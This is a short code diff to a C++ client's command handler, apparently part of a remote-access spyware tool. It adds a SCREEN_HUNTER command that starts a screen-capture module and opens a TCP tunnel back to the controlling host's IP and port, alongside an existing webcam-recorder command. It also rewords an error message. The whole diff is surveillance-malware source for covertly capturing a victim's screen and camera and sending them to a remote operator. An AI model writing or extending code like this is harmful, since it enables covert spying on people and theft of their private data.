@@ -139,10 +139,14 @@ void Client::start() {
                             printf("[Client] Error initiating webcam_recorder\n");
                             rc = -1;
                         }
+                    } else if (command_code == SCREEN_HUNTER) {
+                        printf("[Client] Received SCREEN_HUNTER command");
+                        clspy_tunnel = new CLScreenHunter();
+                        rc = clspy_tunnel->init(ip_, port_ + command_arg, TCP_BASED);
                     }
 
                     if (rc < 0) {
-                        printf("[Client] why the fuck it is deleting\n");
+                        printf("[Client] Unsuccesful initialization\n");
                         delete clspy_tunnel;
                         clspy_tunnel = nullptr;
                         send_out(socket_, EXEC_ERROR);
